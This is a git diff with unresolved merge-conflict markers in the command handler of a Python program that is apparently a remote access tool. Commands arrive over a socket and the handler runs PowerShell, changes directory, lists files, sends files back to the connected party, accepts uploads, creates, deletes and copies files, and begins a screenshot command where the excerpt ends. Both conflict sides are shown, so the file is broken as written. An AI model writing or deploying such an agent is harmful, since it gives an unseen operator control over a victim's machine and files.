@@ -42,13 +42,17 @@ def list_commands():
     """
 
 def execute_command(cmd, conn):
+<<<<<<< HEAD
     global CURRENT_DIR
     
+=======
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
     try:
         if cmd == "?":
             return list_commands()
 
         elif cmd.lower() in ["ls", "dir"]:
+<<<<<<< HEAD
             return execute_powershell(f"cd '{CURRENT_DIR}'; Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")
 
         elif cmd.startswith("cd "):
@@ -63,18 +67,37 @@ def execute_command(cmd, conn):
 
         elif cmd == "pwd":
             return CURRENT_DIR
+=======
+            return execute_powershell("Get-ChildItem -Force | Format-Table -Wrap -AutoSize | Out-String -Width 8192")
+
+        elif cmd.startswith("cd "):
+            path = cmd[3:]
+            os.chdir(path)
+            return f"Current directory: {os.getcwd()}"
+
+        elif cmd == "pwd":
+            return os.getcwd()
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
 
         elif cmd.startswith("ps "):
             return execute_powershell(cmd[3:])
 
         elif cmd.startswith("download "):
             filepath = cmd[9:]
+<<<<<<< HEAD
             abs_path = os.path.join(CURRENT_DIR, filepath) if not os.path.isabs(filepath) else filepath
             if os.path.exists(abs_path):
                 try:
                     filesize = os.path.getsize(abs_path)
                     conn.send(f"FILESIZE {filesize}".encode())
                     with open(abs_path, "rb") as f:
+=======
+            if os.path.exists(filepath):
+                try:
+                    filesize = os.path.getsize(filepath)
+                    conn.send(f"FILESIZE {filesize}".encode())
+                    with open(filepath, "rb") as f:
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
                         while chunk := f.read(4096):
                             conn.send(chunk)
                     return "File transfer complete"
@@ -87,10 +110,16 @@ def execute_command(cmd, conn):
             if len(parts) < 2:
                 return "Usage: upload <file>"
             filename = parts[1]
+<<<<<<< HEAD
             abs_path = os.path.join(CURRENT_DIR, filename)
             conn.send("READY".encode())
             file_size = struct.unpack("!I", conn.recv(4))[0]
             with open(abs_path, "wb") as f:
+=======
+            conn.send("READY".encode())
+            file_size = struct.unpack("!I", conn.recv(4))[0]
+            with open(filename, "wb") as f:
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
                 received = 0
                 while received < file_size:
                     chunk = conn.recv(min(4096, file_size - received))
@@ -98,6 +127,7 @@ def execute_command(cmd, conn):
                         break
                     f.write(chunk)
                     received += len(chunk)
+<<<<<<< HEAD
             return f"File {filename} uploaded successfully to {abs_path}"
 
         elif cmd.startswith("create "):
@@ -112,17 +142,38 @@ def execute_command(cmd, conn):
             if os.path.exists(abs_path):
                 os.remove(abs_path)
                 return f"File {abs_path} deleted"
+=======
+            return f"File {filename} uploaded successfully"
+
+        elif cmd.startswith("create "):
+            filename = cmd[7:]
+            open(filename, "w").close()
+            return f"File {filename} created"
+
+        elif cmd.startswith("delete "):
+            filename = cmd[7:]
+            if os.path.exists(filename):
+                os.remove(filename)
+                return f"File {filename} deleted"
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
             return "FileNotFound"
 
         elif cmd.startswith("copy "):
             parts = cmd.split(" ", 2)
             if len(parts) < 3:
                 return "Usage: copy <src> <dst>"
+<<<<<<< HEAD
             src = os.path.join(CURRENT_DIR, parts[1]) if not os.path.isabs(parts[1]) else parts[1]
             dst = os.path.join(CURRENT_DIR, parts[2]) if not os.path.isabs(parts[2]) else parts[2]
             if os.path.exists(src):
                 shutil.copy(src, dst)
                 return f"File copied from {src} to {dst}"
+=======
+            src, dst = parts[1], parts[2]
+            if os.path.exists(src):
+                shutil.copy(src, dst)
+                return f"File copied to {dst}"
+>>>>>>> 7ff5687715a8a3868da903ecf589932db76541b6
             return "Source file not found"
 
         elif cmd == "screenshot":
